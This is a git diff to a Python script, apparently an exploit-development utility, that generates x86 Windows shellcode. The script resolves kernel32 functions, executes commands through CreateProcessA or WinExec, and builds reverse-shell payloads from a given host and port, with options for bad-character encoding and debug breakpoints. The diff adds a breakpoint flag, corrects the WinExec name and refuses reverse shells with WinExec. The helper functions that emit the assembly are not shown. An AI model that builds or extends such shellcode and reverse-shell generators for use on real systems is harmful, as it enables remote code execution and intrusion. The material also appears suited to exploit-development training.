@@ -1,5 +1,5 @@
 """
-Generate custom shellcode payloads in x86.
+Generate custom shellcode payloads.
 
 Author: wh1rl3y
 Date: 2025-07-07
@@ -23,6 +23,7 @@ parser.add_argument('-lang', '--language', type=str, choices=['python', 'c++'], 
 parser.add_argument('-a', '--assembly', action='store_true', help='Print assembly in full', default=False)
 parser.add_argument('-e', '--execute', action='store_true', help='Execute commands after building', default=False)
 parser.add_argument('-f', '--force_break', action='store_true', help='Add int 3 to assembly to break on start', default=False)
+parser.add_argument('-ff', '--force_break_functions', action='store_true', help='Add int 3 to assembly to break in key funtions', default=False)
 parser.add_argument('-b', '--bad_char', action='append', nargs=2, metavar=('HEX', 'METHOD'),
                    help='Bad character with hex value and method (neg/add[n]/dec[n])')
 parser.add_argument('-py', '--python_script', type=str, help='Create a clean Python script that generate the shellcode. Used when the whole shellcode_builder is not needed', default=None)
@@ -36,11 +37,14 @@ if not args.command:
 
 execute_function = 'CreateProcessA'
 if args.exec == 'WIN_EXEC':
-    execute_function = 'ExecWin'
+    execute_function = 'WinExec'
+    if args.lhost or args.lport:
+       print_info(f'WinExec can not be used for a reverse shell.', FAIL, 0, True)
+       sys.exit()
 
 asm_code = create_asm_start(args.force_break)
 asm_code += find_kernel32()
-asm_code += resolve_kernel32_functions(execute_function, args.verbose)
+asm_code += resolve_kernel32_functions(execute_function, args.verbose, args.force_break_functions)
 
 if args.lhost and args.lport:
     print_info(f'Creating a reverse shell payload', SUCCESS, 0, True)
@@ -72,11 +76,11 @@ for command in args.command:
     print_info (f'Adding command:', SUCCESS, 0, True)
     print_info (f'{command}', SUCCESS, 1, args.verbose)
     cmd_chunks = change_command_to_memory_hex(command, bad_char_list, args.verbose)
-    asm_code += create_startup_info_a(count)
-    asm_code += create_command_string(cmd_chunks, count, args.verbose)
+    asm_code += create_command_string(cmd_chunks, count, args.verbose, args.force_break_functions)
     if args.exec == 'WIN_EXEC':
         asm_code += exec_win(count)
     else:
+        asm_code += create_startup_info_a(count)
         asm_code += create_process_a(count)
     count += 1
 
